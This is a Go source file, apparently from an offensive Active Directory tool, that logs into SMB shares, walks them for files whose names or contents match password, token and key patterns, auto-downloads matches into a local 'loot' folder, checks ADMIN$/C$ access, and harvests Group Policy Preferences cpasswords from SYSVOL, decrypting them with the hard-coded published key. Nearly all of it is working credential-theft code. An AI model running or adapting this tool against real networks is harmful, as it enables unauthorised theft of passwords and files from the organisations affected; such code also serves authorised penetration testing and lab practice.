package advanced

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
)

// GPPSimpleResult represents a found password in GPP
type GPPSimpleResult struct {
	File     string
	User     string
	Password string
	Changed  string
}

// FileFinding represents a sensitive file found on a share
type FileFinding struct {
	Path      string    `json:"path"`
	Share     string    `json:"share"`
	Size      int64     `json:"size"`
	Modified  time.Time `json:"modified"`
	LootFound []string  `json:"loot_found,omitempty"`
}

// SMBAnalyzer handles SMB-related discovery (Shares, GPP, etc.)
type SMBAnalyzer struct {
	Target   string
	Username string
	Password string
	Domain   string
}

// NewSMBAnalyzer creates a new SMB analyzer
func NewSMBAnalyzer(target, user, pass, domain string) *SMBAnalyzer {
	return &SMBAnalyzer{
		Target:   target,
		Username: user,
		Password: pass,
		Domain:   domain,
	}
}

// EnumerateShares lists all available SMB shares
func (sa *SMBAnalyzer) EnumerateShares() ([]string, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer session.Logoff()
	defer conn.Close()

	shares, err := session.ListSharenames()
	if err != nil {
		return nil, fmt.Errorf("failed to list shares: %v", err)
	}

	return shares, nil
}

// DeepFileHunt scans a share for sensitive files
func (sa *SMBAnalyzer) DeepFileHunt(share string) ([]FileFinding, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer session.Logoff()
	defer conn.Close()

	fs, err := session.Mount(share)
	if err != nil {
		return nil, err
	}
	defer fs.Umount()

	var findings []FileFinding
	sensitiveExts := map[string]string{
		".log":    "Log",
		".xml":    "Config",
		".txt":    "Log/Text",
		".config": "Config",
		".ps1":    "Script",
		".bat":    "Script",
		".vbs":    "Script",
		".ini":    "Config",
		".bak":    "Backup",
	}

	sensitiveKeywords := []string{"pass", "cred", "secret", "token", "auth", "key", "db", "sql", "vpn"}

	// Walk the share (depth limited to 3 to avoid infinite loops/large shares)
	sa.walk(fs, ".", 0, 3, sensitiveExts, sensitiveKeywords, share, &findings)

	return findings, nil
}

func (sa *SMBAnalyzer) walk(fs *smb2.Share, path string, depth, maxDepth int, exts map[string]string, keywords []string, share string, findings *[]FileFinding) {
	if depth > maxDepth {
		return
	}

	files, err := fs.ReadDir(path)
	if err != nil {
		return
	}

	for _, file := range files {
		fullName := filepath.Join(path, file.Name())
		if file.IsDir() {
			sa.walk(fs, fullName, depth+1, maxDepth, exts, keywords, share, findings)
			continue
		}

		lowerName := strings.ToLower(file.Name())
		ext := filepath.Ext(lowerName)

		isSensitive := false

		// Check extension
		if _, ok := exts[ext]; ok {
			isSensitive = true
		}

		// Check keywords
		for _, kw := range keywords {
			if strings.Contains(lowerName, kw) {
				isSensitive = true
				break
			}
		}

		if isSensitive {
			stat, err := fs.Stat(fullName)
			if err != nil {
				continue
			}

			finding := FileFinding{
				Path:     fullName,
				Share:    share,
				Size:     file.Size(),
				Modified: stat.ModTime(),
			}

	// RAID AND DOWNLOAD
	log.Printf("    [*] Raiding %s for secrets...", fullName)
	loot := sa.RaidFileForSecrets(fs, fullName)
			if len(loot) > 0 {
				finding.LootFound = loot
			}

			// AUTO-DOWNLOAD
			localPath := filepath.Join("loot", share, fullName)
			os.MkdirAll(filepath.Dir(localPath), 0755)
			if err := sa.DownloadFile(fs, fullName, localPath); err == nil {
				log.Printf("    %s[+] Downloaded: %s → %s%s", util.Green, fullName, localPath, util.Reset)
			}

			*findings = append(*findings, finding)
		}
	}
}

// RaidFileForSecrets reads the beginning of a file and greps for credentials
func (s *SMBAnalyzer) RaidFileForSecrets(fs *smb2.Share, path string) []string {
	f, err := fs.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	// Read first 8KB
	buf := make([]byte, 8192)
	n, err := f.Read(buf)
	if err != nil && n == 0 {
		return nil
	}
	content := string(buf[:n])

	// Aggressive Regex patterns for secrets (including natural language)
	patterns := map[string]string{
		"Password": `(?i)(password|pass|pwd|passwd|secret)\s*(is|[:=])\s*([^\s"';]+)`,
		"Token":    `(?i)(token|key|api|cred|creds)\s*(is|[:=])\s*([^\s"';]+)`,
		"Generic":  `(?i)(login|user|admin)\s*(is|[:=])\s*([^\s"';]+)`,
		"Naked":    `(?i)(password|pwd|secret)\s*([^\s"';]{6,})`, // Catch "password Summer2025!"
	}

	var loot []string
	for name, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllStringSubmatch(content, -1)
		for _, m := range matches {
			if len(m) > 2 {
				secret := strings.TrimSpace(m[2])
				// Filter out noise
				if len(secret) > 3 && !strings.Contains(strings.ToLower(secret), "account") {
					loot = append(loot, fmt.Sprintf("%s: %s", name, secret))
				}
			}
		}
	}

	return loot
}

// DownloadFile downloads a file from an SMB share to a local path
func (s *SMBAnalyzer) DownloadFile(fs *smb2.Share, remotePath, localPath string) error {
	f, err := fs.Open(remotePath)
	if err != nil {
		return err
	}
	defer f.Close()

	local, err := os.Create(localPath)
	if err != nil {
		return err
	}
	defer local.Close()

	_, err = io.Copy(local, f)
	return err
}

// CheckAdminAccess checks if the user has administrative access (can access ADMIN$ or C$)
func (sa *SMBAnalyzer) CheckAdminAccess() (bool, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return false, err
	}
	defer session.Logoff()
	defer conn.Close()

	// Try to mount ADMIN$
	fs, err := session.Mount("ADMIN$")
	if err == nil {
		fs.Umount()
		return true, nil
	}

	// Fallback to C$
	fs, err = session.Mount("C$")
	if err == nil {
		fs.Umount()
		return true, nil
	}

	return false, nil
}

// ScanGPP searches SYSVOL for GPP passwords
func (sa *SMBAnalyzer) ScanGPP() ([]GPPSimpleResult, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer session.Logoff()
	defer conn.Close()

	// Connect to SYSVOL
	fs, err := session.Mount("SYSVOL")
	if err != nil {
		return nil, fmt.Errorf("failed to mount SYSVOL: %v", err)
	}
	defer fs.Umount()

	var results []GPPSimpleResult

	// Walk SYSVOL searching for XML files
	err = sa.walkGPP(fs, ".", &results)
	if err != nil {
		log.Printf("[!] Error walking SYSVOL: %v", err)
	}

	return results, nil
}

func (sa *SMBAnalyzer) walkGPP(fs *smb2.Share, path string, results *[]GPPSimpleResult) error {
	files, err := fs.ReadDir(path)
	if err != nil {
		return nil
	}

	for _, file := range files {
		fullName := filepath.Join(path, file.Name())
		if file.IsDir() {
			sa.walkGPP(fs, fullName, results)
			continue
		}

		if strings.HasSuffix(strings.ToLower(file.Name()), ".xml") {
			data, err := fs.ReadFile(fullName)
			if err != nil {
				continue
			}

			if bytes.Contains(data, []byte("cpassword")) {
				log.Printf("[+] Found potential GPP file: %s", fullName)
				creds := sa.parseGPPXML(data)
				for _, cred := range creds {
					cred.File = fullName
					*results = append(*results, cred)
				}
			}
		}
	}
	return nil
}

func (sa *SMBAnalyzer) createSession() (*smb2.Session, net.Conn, error) {
	addr := sa.Target
	if !strings.Contains(addr, ":") {
		addr = fmt.Sprintf("%s:445", addr)
	}

	// List of domain formats to try
	domains := []string{sa.Domain, "", strings.ToLower(sa.Domain)}
	
	// Add .htb and .local guesses in lowercase
	if !strings.Contains(sa.Domain, ".") && sa.Domain != "" {
		domains = append(domains, strings.ToLower(sa.Domain)+".htb")
		domains = append(domains, strings.ToLower(sa.Domain)+".local")
	}

	// Clean the username (strip existing domain if present)
	cleanUser := sa.Username
	if strings.Contains(cleanUser, "\\") {
		parts := strings.SplitN(cleanUser, "\\", 2)
		cleanUser = parts[1]
	} else if strings.Contains(cleanUser, "@") {
		parts := strings.SplitN(cleanUser, "@", 2)
		cleanUser = parts[0]
	}

	var lastErr error
	// Loop 1: Standard Domain\User formats
	for _, dName := range domains {
		if s, conn, err := sa.tryDial(dName, cleanUser); err == nil {
			return s, conn, nil
		} else {
			lastErr = err
		}
	}

	// Loop 2: UPN Format (user@domain.htb)
	if sa.Domain != "" {
		domainPart := strings.ToLower(sa.Domain)
		if !strings.Contains(domainPart, ".") {
			domainPart = domainPart + ".htb"
		}
		upnUser := fmt.Sprintf("%s@%s", cleanUser, domainPart)
		
		if s, conn, err := sa.tryDial("", upnUser); err == nil {
			return s, conn, nil
		}
	}

	return nil, nil, fmt.Errorf("SMB session failed: %v", lastErr)
}

func (sa *SMBAnalyzer) tryDial(domain, user string) (*smb2.Session, net.Conn, error) {
	conn, err := net.DialTimeout("tcp", sa.Target+":445", 5*time.Second)
	if err != nil {
		return nil, nil, err
	}

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: sa.Password,
		},
	}

	s, err := d.Dial(conn)
	if err != nil {
		conn.Close()
		return nil, nil, err
	}

	return s, conn, nil
}

func (sa *SMBAnalyzer) parseGPPXML(data []byte) []GPPSimpleResult {
	// Simple string parsing to avoid complex XML dependencies
	var results []GPPSimpleResult
	
	// Look for cpassword patterns
	content := string(data)
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		if strings.Contains(line, "cpassword=") {
			user := sa.extractAttr(line, "userName=")
			cpass := sa.extractAttr(line, "cpassword=")
			changed := sa.extractAttr(line, "changed=")
			
			if cpass != "" {
				pass, _ := DecryptGPP(cpass)
				results = append(results, GPPSimpleResult{
					User:     user,
					Password: pass,
					Changed:  changed,
				})
			}
		}
	}
	return results
}

func (sa *SMBAnalyzer) extractAttr(line, attr string) string {
	if idx := strings.Index(line, attr); idx != -1 {
		val := line[idx+len(attr):]
		if len(val) > 1 {
			quote := val[0:1]
			val = val[1:]
			if endIdx := strings.Index(val, quote); endIdx != -1 {
				return val[:endIdx]
			}
		}
	}
	return ""
}

// DecryptGPP decrypts a GPP cpassword string
func DecryptGPP(cpassword string) (string, error) {
	// The famous GPP key
	key := []byte{
		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
		0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
		0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
	}

	// Fix padding if needed
	for len(cpassword)%4 != 0 {
		cpassword += "="
	}

	decoded, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	if len(decoded) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	iv := make([]byte, aes.BlockSize) // GPP uses null IV
	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(decoded))
	mode.CryptBlocks(plaintext, decoded)

	// Unpad (PKCS7)
	if len(plaintext) == 0 {
		return "", fmt.Errorf("decryption failed")
	}
	padding := int(plaintext[len(plaintext)-1])
	if padding > len(plaintext) {
		return string(plaintext), nil // Return as is if padding looks wrong
	}
	
	// Convert from UTF-16LE to UTF-8 (simple approach)
	var result strings.Builder
	for i := 0; i < len(plaintext)-padding; i += 2 {
		if i+1 < len(plaintext) {
			result.WriteByte(plaintext[i])
		}
	}

	return result.String(), nil
}
